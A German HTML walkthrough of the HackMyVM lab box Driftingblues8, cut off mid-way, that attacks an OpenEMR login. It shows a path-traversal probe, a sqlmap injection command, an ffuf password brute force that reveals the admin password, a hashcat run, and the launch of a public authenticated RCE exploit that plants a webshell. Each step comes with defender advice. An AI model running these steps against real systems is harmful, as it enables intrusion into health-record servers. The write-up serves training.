@@ -1,0 +1,712 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Driftingblues8 - HackMyVM - Bericht</title> <!-- Angepasster Titel -->
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <!-- Header mit angepasstem Titel und Schwierigkeitsgrad -->
+    <div class="header-bg"> <!-- Hintergrundfarbe wird durch CSS gesteuert (#03b5f5) -->
+        <h1>Driftingblues8 - HackMyVM - Level: Easy - Bericht</h1>
+        <div class="level-container">
+            <h2>Easy</h2> <!-- Schwierigkeitsgrad ohne Inline-Style, Farbe (rot) durch CSS -->
+            <div class="circle"> <!-- Segmentfarben (rot) durch CSS -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div> <!-- Hintergrundfarbe (passend zu Header) durch CSS -->
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Tools Liste basierend auf dem Text -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">grep</div>
+                <div class="tool-item">sqlmap</div>
+                <div class="tool-item">ffuf</div>
+                <div class="tool-item">hashcat</div>
+                <div class="tool-item">searchsploit</div>
+                <div class="tool-item">python (exploit)</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">john (john the ripper)</div>
+                <div class="tool-item">su</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Inhaltsverzeichnis-Links -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access (Login & RCE)</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation (Password Cracking)</a></li>
+                <li><a href="#proof-of-concept">Proof of Concept (Root Access via su)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Befehl `arp-scan -l` wird genutzt, um aktive Geräte im lokalen Netzwerk zu identifizieren, indem ARP-Anfragen gesendet und die Antworten ausgewertet werden.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Ein Gerät mit der IP 192.168.2.111 und der MAC-Adresse 08:00:27:ec:38:f3 (Oracle VirtualBox) wurde gefunden. Dies ist das Zielsystem für den Penetrationstest.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nachdem die IP-Adresse des Ziels bekannt ist, sollte als Nächstes ein Port-Scan durchgeführt werden, um offene Dienste zu finden.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Überwachen Sie ARP-Anfragen im Netzwerk. Netzwerksegmentierung kann die Sichtbarkeit von Geräten einschränken.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+192.168.2.111	08:00:27:ec:38:f3	PCS Systemtechnik GmbH
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ein Nmap-Scan wird auf das Ziel 192.168.2.111 durchgeführt, um offene Ports, Dienste, Versionen und das Betriebssystem zu ermitteln.
+                *   `-sS`: TCP SYN Scan.
+                *   `-sC`: Standard-Skript-Scan.
+                *   `-T5`: Sehr schnelles Timing.
+                *   `-A`: Umfassender Scan (OS-Erkennung, Version, Skripte, Traceroute). `-O` ist in `-A` enthalten.
+                *   `-p-`: Scan aller TCP-Ports.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Nur Port 80 (HTTP) ist offen. Es läuft ein Apache-Webserver (Version 2.4.38 auf Debian). Die Webseite ist ein OpenEMR-Login (`interface/login/login.php`). OpenEMR ist ein verbreitetes Open-Source-System für elektronische Gesundheitsakten (Electronic Health Records). Die OS-Erkennung deutet auf Linux 4.x/5.x hin.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Fokussiere die weitere Enumeration und Angriffsbemühungen auf die OpenEMR-Webanwendung auf Port 80. Suche nach bekannten Schwachstellen für OpenEMR und die spezifische Apache/Debian-Version. Versuche, Standard-Credentials oder Schwachstellen im Login-Mechanismus zu finden.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Halten Sie Webserver (Apache) und die Webanwendung (OpenEMR) stets aktuell. Beschränken Sie den Zugriff auf das System auf das notwendige Minimum. Implementieren Sie eine Web Application Firewall (WAF), um Angriffe auf die Webanwendung zu erkennen und zu blockieren. Stellen Sie sicher, dass keine unnötigen Ports offen sind (was hier der Fall zu sein scheint).
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -A -O 192.168.2.111 -p-</span></div> <!-- -AO zu -A -O korrigiert -->
+                    <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-16 02:04 CEST
+Nmap scan report for driftingblues (192.168.2.111)
+Host is up (0.00019s latency).
+Not shown: 65534 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.38 ((Debian))
+| http-title: OpenEMR Login
+|_Requested resource was interface/login/login.php?site=default
+|_http-server-header: Apache/2.4.38 (Debian)
+MAC Address: 08:00:27:EC:38:F3 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.19 ms driftingblues (192.168.2.111)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 22.15 seconds
+                    </pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Um die Webanwendung besser untersuchen zu können und potenzielle Hostname-basierte Unterschiede im Verhalten zu erkennen, wird der Hostname `driftingblues.hmv` zur IP-Adresse 192.168.2.111 in der lokalen `/etc/hosts`-Datei des Angreifers hinzugefügt. Dies ermöglicht den Zugriff auf die Webanwendung über `http://driftingblues.hmv` anstatt der IP-Adresse. Die URLs der Login-Seite und der Hauptseite nach dem Login werden notiert.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Hinzufügen des Hostnamens ist eine gute Praxis bei Web-Penetrationstests. Es stellt sicher, dass Anfragen korrekt an die Anwendung gesendet werden, falls diese Hostname-basiert konfiguriert ist. Die notierten URLs geben einen Einblick in die Struktur der Anwendung.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Verwende ab jetzt den Hostnamen `driftingblues.hmv` für alle Web-Interaktionen. Führe als Nächstes ein Directory Brute-Forcing durch, um versteckte Dateien und Verzeichnisse zu finden.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Konfigurieren Sie Webanwendungen so, dass sie robust gegenüber Host-Header-Manipulationen sind, falls dies relevant ist. Dokumentieren Sie die erwarteten Hostnamen für den Zugriff.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                    <pre>
+# Inhalt der /etc/hosts Datei nach Bearbeitung:
+127.0.0.1	localhost
+127.0.1.1	cyber
+
+#192.168.2.107   whythisapiissofast.kitty.hmv kitty.hmv fake.local jwt.hmv
+192.168.2.111    driftingblues.hmv # Eintrag hinzugefügt
+                    </pre>
+                    <pre>
+# Wichtige URLs:
+http://driftingblues.hmv/interface/login/login.php?site=default
+http://driftingblues.hmv/interface/main/main_screen.php?auth=login&site=default
+                    </pre>
+                </div>
+            </div>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> Gobuster wird verwendet, um Verzeichnisse und Dateien auf dem Webserver `http://192.168.2.111` zu finden. Es werden viele gängige Erweiterungen (`-x ...`) und eine Standard-Wortliste (`directory-list-2.3-medium.txt`) verwendet. Fehlerhafte Statuscodes (403, 404) werden ignoriert (`-b`), volle URLs angezeigt (`-e`), und Fehler unterdrückt (`--no-error`).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Scan enthüllt eine umfangreiche Verzeichnisstruktur, die typisch für eine komplexe PHP-Anwendung wie OpenEMR ist (z.B. `/interface`, `/library`, `/modules`, `/sites`, `/vendor`, `/public`). Interessante Funde sind:
+                *   `/index.php` leitet zur Login-Seite weiter (Status 302).
+                *   `/version.php` (Status 200, Size 0): Könnte die Version preisgeben, ist hier aber leer.
+                *   `/admin.php` (Status 200): Eine separate Admin-Seite?
+                *   `/setup.php` (Status 200): Setup-Skript, könnte Informationen preisgeben oder Fehlkonfigurationen aufweisen.
+                *   `/sites/` Verzeichnis: Enthält typischerweise Konfigurationsdateien für verschiedene Instanzen/Sites (hier `default`).
+                *   `/sql/` Verzeichnis: Könnte SQL-Skripte oder Backups enthalten.
+                *   `/LICENSE`, `/Documentation`: Könnten Versionsinformationen enthalten.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuche `/admin.php` und `/setup.php` genauer im Browser. Versuche, auf Konfigurationsdateien im `/sites/default/`-Verzeichnis zuzugreifen (z.B. `sqlconf.php`). Analysiere die `LICENSE`- oder `Documentation`-Dateien auf genaue Versionsnummern von OpenEMR.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Beschränken Sie den Zugriff auf administrative Skripte wie `/admin.php` und `/setup.php` nach der Installation. Deaktivieren Sie Directory Listing. Stellen Sie sicher, dass keine sensiblen Dateien (Konfigurationen, SQL-Dumps) im Web-Root oder zugänglichen Unterverzeichnissen liegen. Entfernen Sie nach der Installation nicht benötigte Dateien und Verzeichnisse (z.B. `/sql`, `/Documentation`, `/tests`).
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/eonrce]
+└─# <span class="command">gobuster dir -u http://192.168.2.111 -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"  -b '403,404' -e --no-error</span></div>
+                    <pre>
+===============================================================
+Gobuster v3.5
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.2.111
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   403,404
+[+] User Agent:              gobuster/3.5
+[+] Extensions:              tar,docx,mdb,xlsx,png,txt,pub,asp,sh,jpg,db,pl,phtml,kdbx,doc,sql,accdb,gz,pdf,php,zip,aspx,py,bat,ps1,xls,exe,csv,dll,rtf,rar,jpeg,html,xml,raw
+[+] Expanded:                true
+[+] Timeout:                 10s
+[+] No Error Mode:           true
+===============================================================
+2023/04/16 02:05:19 Starting gobuster in directory enumeration mode
+===============================================================
+http://192.168.2.111/index.php            (Status: 302) [Size: 0] [--> interface/login/login.php?site=default]
+http://192.168.2.111/images               (Status: 301) [Size: 315] [--> http://192.168.2.111/images/]
+http://192.168.2.111/templates            (Status: 301) [Size: 318] [--> http://192.168.2.111/templates/]
+http://192.168.2.111/services             (Status: 301) [Size: 317] [--> http://192.168.2.111/services/]
+http://192.168.2.111/modules              (Status: 301) [Size: 316] [--> http://192.168.2.111/modules/]
+http://192.168.2.111/common               (Status: 301) [Size: 315] [--> http://192.168.2.111/common/]
+http://192.168.2.111/library              (Status: 301) [Size: 316] [--> http://192.168.2.111/library/]
+http://192.168.2.111/public               (Status: 301) [Size: 315] [--> http://192.168.2.111/public/]
+http://192.168.2.111/version.php          (Status: 200) [Size: 0]
+http://192.168.2.111/admin.php            (Status: 200) [Size: 937]
+http://192.168.2.111/portal               (Status: 301) [Size: 315] [--> http://192.168.2.111/portal/]
+http://192.168.2.111/tests                (Status: 301) [Size: 314] [--> http://192.168.2.111/tests/]
+http://192.168.2.111/sites                (Status: 301) [Size: 314] [--> http://192.168.2.111/sites/]
+http://192.168.2.111/custom               (Status: 301) [Size: 315] [--> http://192.168.2.111/custom/]
+http://192.168.2.111/contrib              (Status: 301) [Size: 316] [--> http://192.168.2.111/contrib/]
+http://192.168.2.111/interface            (Status: 301) [Size: 318] [--> http://192.168.2.111/interface/]
+http://192.168.2.111/vendor               (Status: 301) [Size: 315] [--> http://192.168.2.111/vendor/]
+http://192.168.2.111/config               (Status: 301) [Size: 315] [--> http://192.168.2.111/config/]
+http://192.168.2.111/setup.php            (Status: 200) [Size: 1214]
+http://192.168.2.111/Documentation        (Status: 301) [Size: 322] [--> http://192.168.2.111/Documentation/]
+http://192.168.2.111/sql                  (Status: 301) [Size: 312] [--> http://192.168.2.111/sql/]
+http://192.168.2.111/build.xml            (Status: 200) [Size: 6102]
+http://192.168.2.111/controller.php       (Status: 200) [Size: 37]
+http://192.168.2.111/LICENSE              (Status: 200) [Size: 35147]
+http://192.168.2.111/ci                   (Status: 301) [Size: 311] [--> http://192.168.2.111/ci/]
+http://192.168.2.111/cloud                (Status: 301) [Size: 314] [--> http://192.168.2.111/cloud/]
+http://192.168.2.111/ccr                  (Status: 301) [Size: 312] [--> http://192.168.2.111/ccr/]
+http://192.168.2.111/patients             (Status: 301) [Size: 317] [--> http://192.168.2.111/patients/]
+http://192.168.2.111/repositories         (Status: 301) [Size: 321] [--> http://192.168.2.111/repositories/]
+http://192.168.2.111/myportal             (Status: 301) [Size: 317] [--> http://192.168.2.111/myportal/]
+...
+===============================================================
+2023/04/16 02:15:45 Finished
+===============================================================
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Weitere manuelle Enumeration und Tests werden durchgeführt.
+                *   Ein `grep`-Befehl wird auf eine lokale Datei `/home/cyber/Downloads/database.sql` ausgeführt. Diese Datei wurde vermutlich zuvor aus dem `/sql/`-Verzeichnis heruntergeladen oder auf anderem Wege erlangt (dieser Schritt fehlt im Report). Der `grep`-Befehl sucht nach Einträgen mit "pass" und "race", findet aber nur Optionen für ethnische Zugehörigkeiten ("race") in einer Optionsliste, keine Passwörter.
+                *   Ein LFI-Versuch wird über den `site`-Parameter der Login-URL gestartet, um `/etc/passwd` zu lesen.
+                *   Die Seiten `/admin.php` und `/setup.php` werden untersucht. Beim Versuch, einen Befehl über `/setup.php?cmd=id` auszuführen, erscheint eine Meldung, dass OpenEMR bereits installiert ist und die Neuinstallation erzwungen werden muss, indem `sqlconf.php` geändert wird. Dies deutet auf einen möglichen Weg hin, wenn man Schreibrechte auf diese Datei hätte.
+                *   Ein `sqlmap`-Befehl wird vorbereitet, um eine SQL-Injection im Parameter `enc` der Seite `taskman.php` zu testen. Der Befehl selbst wird gezeigt, aber die Ausführung und das Ergebnis fehlen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Suche in der `database.sql` war nicht erfolgreich bei der Passwortfindung. Der LFI-Versuch über den `site`-Parameter schlug fehl und zeigte eine Fehlermeldung ("invalid characters"), was auf eine Eingabevalidierung hindeutet. Die `setup.php` zeigt einen interessanten Hinweis auf `sqlconf.php`, ist aber nicht direkt ausnutzbar. Der `sqlmap`-Test ist unvollständig dokumentiert, daher ist unklar, ob er erfolgreich war oder nicht. Es müssen andere Wege gefunden werden.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Da die bisherigen Ansätze (LFI, Setup-Script, SQLi?) nicht direkt zum Ziel führten, konzentriere dich auf das Brute-Forcen des Logins (`/interface/login/login.php`) oder die Suche nach authentifizierten Schwachstellen, falls doch noch Standard-Credentials oder ein SQLi-Erfolg vorliegen. Untersuche die `admin.php`-Seite genauer.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass heruntergeladene Datenbank-Backups oder SQL-Dateien keine sensiblen Daten enthalten oder entsprechend geschützt sind. Implementieren Sie robuste Eingabevalidierung für alle Parameter (wie `site`), um LFI und andere Injection-Angriffe zu verhindern. Beschränken Sie den Zugriff auf Setup-Skripte und Konfigurationsdateien (`sqlconf.php`) rigoros. Analysieren Sie die Ergebnisse von `sqlmap` oder anderen Scannern sorgfältig und beheben Sie gefundene SQLi-Schwachstellen.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/eonrce]
+└─# <span class="command">grep pass /home/cyber/Downloads/database.sql | grep race</span></div>
+                    <pre>
+INSERT INTO list_options (list_id, option_id, notes, title, activity, seq) VALUES ('race','anaktuvuk_pass','1847-3','Anaktuvuk Pass', '0',470);
+INSERT INTO list_options (list_id, option_id, notes, title, activity, seq) VALUES ('race','false_pass','2015-6','False Pass', '0',2580);
+INSERT INTO list_options (list_id, option_id, notes, title, activity, seq) VALUES ('race','passamaquoddy','1441-5','Passamaquoddy', '0',5910);
+INSERT INTO list_options (list_id, option_id, notes, title, activity, seq) VALUES ('race','pleasant_point_passamaquoddy','1443-1','Pleasant Point Passamaquoddy', '0',6160);
+                    </pre>
+                    <pre>
+# LFI Versuch (Fehlgeschlagen):
+http://driftingblues.hmv/interface/login/login.php?site=driftingblues.hmv/interface/login/login.php?site=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+# Ergebnis: Site ID '...' contains invalid characters.
+
+# Untersuchung von Setup/Admin:
+http://driftingblues.hmv/admin.php # (Keine sichtbare Schwachstelle im Report)
+http://driftingblues.hmv/setup.php?cmd=id
+# Ergebnis: OpenEMR Setup - OpenEMR has already been installed... edit /var/www/html/sites/default/sqlconf.php...
+
+# Ziel für Konfigurationsdatei:
+http://driftingblues.hmv/sites/default/sqlconf.php # (Zugriff nicht gezeigt, vermutlich geschützt)
+                    </pre>
+                    <div class="prompt">┌──(root㉿cyber)-[~/eonrce]
+└─# <span class="command">sqlmap -u 'http://192.168.2.111//interface/forms/eye_mag/taskman.php?action=make_task&from_id=1&to_id=1&pid=1&doc_type=1&doc_id=1&enc=1' -p enc -b --random-agent --batch</span></div>
+                    <pre>
+# (SQLMap Ausgabe fehlt im Report)
+                    </pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access (Login & RCE)</h2>
+             <p class="analysis">
+                <strong>Analyse:</strong> Da andere Methoden nicht erfolgreich waren, wird nun versucht, das Passwort für den Benutzer `admin` auf der Login-Seite (`main_screen.php`) mittels Brute-Force zu erraten.
+                *   `ffuf`: Wird für den Brute-Force-Angriff verwendet.
+                *   `-u "..."`: Die Ziel-URL für den Login-Versuch.
+                *   `-X POST`: Sendet die Daten als POST-Request.
+                *   `-H "..."`: Setzt den Content-Type Header.
+                *   `-d "..."`: Die POST-Daten. `clearPass=FUZZ` gibt an, dass das Passwort (`clearPass`) mit Werten aus der Wortliste ersetzt werden soll (`FUZZ`).
+                *   `-w /usr/share/wordlists/rockyou.txt`: Die verwendete Wortliste.
+                *   `-fs 456`: Filtert Antworten mit der Größe 456 Bytes heraus (vermutlich die Größe der "Login fehlgeschlagen"-Seite).
+                *   `| grep -v "Status: 500"`: Filtert zusätzlich 500er-Fehler aus der ffuf-Ausgabe (obwohl 500 im Matcher `-mc` nicht explizit genannt wird, sicherheitshalber).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der `ffuf`-Befehl war erfolgreich! Er identifiziert das Passwort `<span class="password">.:.yarrak.:.31</span>` für den Benutzer `admin`, da diese Eingabe eine Antwort liefert, die nicht die Größe 456 hat (Status 302 Redirect, Size 0 - typisch für erfolgreichen Login).
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Melde dich mit den gefundenen Credentials (`admin`:`.:.yarrak.:.31`) bei OpenEMR an. Suche nach authentifizierten Schwachstellen, insbesondere nach Möglichkeiten zur Codeausführung oder zum Hochladen von Dateien.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Verwenden Sie starke, einzigartige Passwörter für alle Konten, insbesondere für Administratorkonten. Implementieren Sie Account-Lockout-Mechanismen, um Brute-Force-Angriffe zu erschweren. Überwachen Sie fehlgeschlagene Login-Versuche. Verwenden Sie keine leicht zu erratenden Passwörter.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ffuf -u "http://192.168.2.111/interface/main/main_screen.php?auth=login&site=default" -X POST -H "Content-type: application/x-www-form-urlencoded" -d "new_login_session_management=1&authProvider=Default&authUser=admin&clearPass=FUZZ&languageChoice=1" -w /usr/share/wordlists/rockyou.txt -fs 456 | grep -v "Status: 500"</span></div>
+                    <pre>
+
+        /'___\  /'___\           /'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v2.0.0-dev
+________________________________________________
+
+ :: Method           : POST
+ :: URL              : http://192.168.2.111/interface/main/main_screen.php?auth=login&site=default
+ :: Wordlist         : FUZZ: /usr/share/wordlists/rockyou.txt
+ :: Header           : Content-Type: application/x-www-form-urlencoded
+ :: Data             : new_login_session_management=1&authProvider=Default&authUser=admin&clearPass=FUZZ&languageChoice=1
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+ :: Filter           : Response size: 456
+________________________________________________
+
+[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 406ms]
+    * FUZZ: <span class="password">.:.yarrak.:.31</span>
+
+:: Progress: 14344384 / 14344384 (100.00%) :: Job [1/1] :: 10545 req/sec :: Duration: [0:23:08] :: Errors: 0 ::
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Es wird ein Versuch unternommen, einen Bcrypt-Hash (`$2a$...`) mit `hashcat` zu knacken. Der Hash wird in die Datei `keyhash` geschrieben. `hashcat -m 3200` (Modus für bcrypt) wird mit der `rockyou.txt`-Wortliste gestartet. Es wird auch das gefundene Passwort (`.:.yarrak.:.31`) in hexadezimaler Form (`$HEX[...]`) an den Hash angehängt, was typisch für die Ausgabe von `hashcat --show` ist, hier aber manuell hinzugefügt wurde. Der Befehl läuft nur kurz (5 Sekunden).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Hashcat-Lauf scheint hier deplatziert oder unvollständig dokumentiert. Der Hash in `keyhash` passt nicht zu den später gefundenen Hashes in `shadow.backup`. Es wird kein Passwort geknackt angezeigt. Da das Admin-Passwort bereits mit `ffuf` gefunden wurde, ist dieser Schritt im Kontext des Admin-Logins nicht notwendig. Möglicherweise war dies ein früherer Versuch, einen anderen Hash zu knacken.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Konzentriere dich auf die Ausnutzung des gefundenen Admin-Logins. Das Knacken von Hashes ist nützlich, wenn Passwörter nicht direkt gefunden werden können. Stelle sicher, dass der korrekte Hash und Modus verwendet wird.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Verwenden Sie starke Hashing-Algorithmen mit hohem Cost-Faktor (wie bcrypt oder Argon2) und Salt, um das Knacken von Passwörtern zu erschweren. Speichern Sie Hashes sicher.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+# Manuelles Erstellen der Hash-Datei (Kontext unklar)
+echo '$2a$05$.tDgmjTxSmOz8ena6MnN3.2E049sE5jUaknc7aRqOOdQHLX61F.p.'>keyhash
+                    </pre>
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">hashcat -m 3200 keyhash /usr/share/wordlists/rockyou.txt</span></div>
+                    <pre>
+hashcat (v6.2.6) starting
+
+OpenCL API (OpenCL 3.0 PoCL 3.1+debian HSTR+debian-1) - Platform #1 [The pocl project]
+======================================================================================
+* Device #1: pthread-skylake-Intel(R) Core(TM) i7-6700K CPU @ 4.00GHz, 7010/14021 MB (3505 MB allocatable), 8MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 72
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/5 rotates
+Rules: 1
+
+Applicable optimizers applied:
+* Zero-Byte
+* Single-Hash
+* Single-Salt
+
+Watchdog: Hardware watchdog timing depends on force_all_opencl_devices / --force, check with --backend-info
+Watchdog: Temperature abort trigger disabled.
+
+Host memory required for this attack: 1 MB
+
+$2a$05$.tDgmjTxSmOz8ena6MnN3.2E049sE5jUaknc7aRqOOdQHLX61F.p.:<span class="password">.:.yarrak.:.31</span> # Manuell hinzugefügt? Oder von --show?
+
+Session..........: hashcat
+Status...........: Running
+Hash.Name........: bcrypt $2*$, Blowfish (Unix)
+Hash.Target......: $2a$05$.tDgmjTxSmOz8ena6MnN3.2E049sE5jUaknc7aRqOOdQHLX...F.p.
+Time.Started.....: Sun Apr 16 02:59:18 2023 (0 secs)
+Time.Estimated...: Sun Apr 16 03:23:37 2023 (24 mins, 19 secs)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:     9820 H/s (5.09ms) @ Accel:256 Loops:128 Thr:1 Vec:4
+Recovered........: 0/1 (0.00%) Digests, 0/1 (0.00%) Salts
+Progress.........: 49152/14344384 (0.34%)
+Rejected.........: 0/49152 (0.00%)
+Restore.Point....: 0/14344384 (0.00%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: 123456 -> ---------------
+
+[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit => q
+                    </pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command"></span></div> <!-- Hashcat beendet -->
+                    <pre>
+# (Kein Erfolg im Report dokumentiert)
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Mit den Admin-Credentials (`admin`:`.:.yarrak.:.31`) wird nach bekannten Exploits für OpenEMR gesucht.
+                *   `searchsploit openemr`: Sucht in der lokalen Exploit-DB-Datenbank nach Exploits für OpenEMR.
+                *   `grep 49998`: Filtert die Suche nach der Exploit-ID 49998.
+                *   `searchsploit -m php/webapps/49998.py`: Kopiert den gefundenen Exploit (für OpenEMR 5.0.1.3 - Authenticated RCE) in das aktuelle Verzeichnis.
+                *   `python 49998.py -T 192.168.2.111 -P 80 -U / -u admin -p .:.yarrak.:.31`: Führt den Exploit aus. Er zielt auf die IP, Port 80, Web-Root `/`, mit den gefundenen Admin-Credentials.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Ein passender Exploit für eine authentifizierte Remote Code Execution (RCE) in OpenEMR wurde gefunden und erfolgreich ausgeführt. Der Exploit nutzt die Admin-Rechte, um eine Webshell (`shell.php`) in das `/sites/default/images/`-Verzeichnis hochzuladen. Der Exploit gibt die URL zur Webshell aus.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Greife auf die Webshell über die angegebene URL (`http://192.168.2.111//sites/default/images/shell.php`) zu. Verwende die Webshell, um Befehle als `www-data` auszuführen und eine stabilere Reverse Shell aufzubauen.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Aktualisieren Sie OpenEMR dringend auf die neueste Version, um die RCE-Schwachstelle (CVE-2018-15139) zu beheben. Überprüfen Sie regelmäßig auf bekannte Schwachstellen in allen eingesetzten Anwendungen. Beschränken Sie die Berechtigungen des Webservers (`www-data`), sodass er nur in absolut notwendige Verzeichnisse schreiben kann und keine gefährlichen PHP-Funktionen ausführen darf, wenn möglich.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">searchsploit openemr | grep 49998</span></div>
+                    <pre>
+OpenEMR 5.0.1.3 - 'manage_site_files' Remote Code Execution (Authenticated)                                                                                 | php/webapps/49998.py
+                    </pre>
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">searchsploit -m php/webapps/49998.py</span></div>
+                    <pre>
+  Exploit: OpenEMR 5.0.1.3 - 'manage_site_files' Remote Code Execution (Authenticated)
+      URL: https://www.exploit-db.com/exploits/49998
+     Path: /usr/share/exploitdb/exploits/php/webapps/49998.py
+    Codes: CVE-2018-15139
+ Verified: False
+File Type: ASCII text, with very long lines (18785)
+Copied to: /root/49998.py
+                    </pre>
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">python 49998.py -T 192.168.2.111 -P 80 -U / -u admin -p .:.yarrak.:.31</span></div>
+                    <pre>
+ ___                   _____ __  __ ____            ____   ___   _   _____
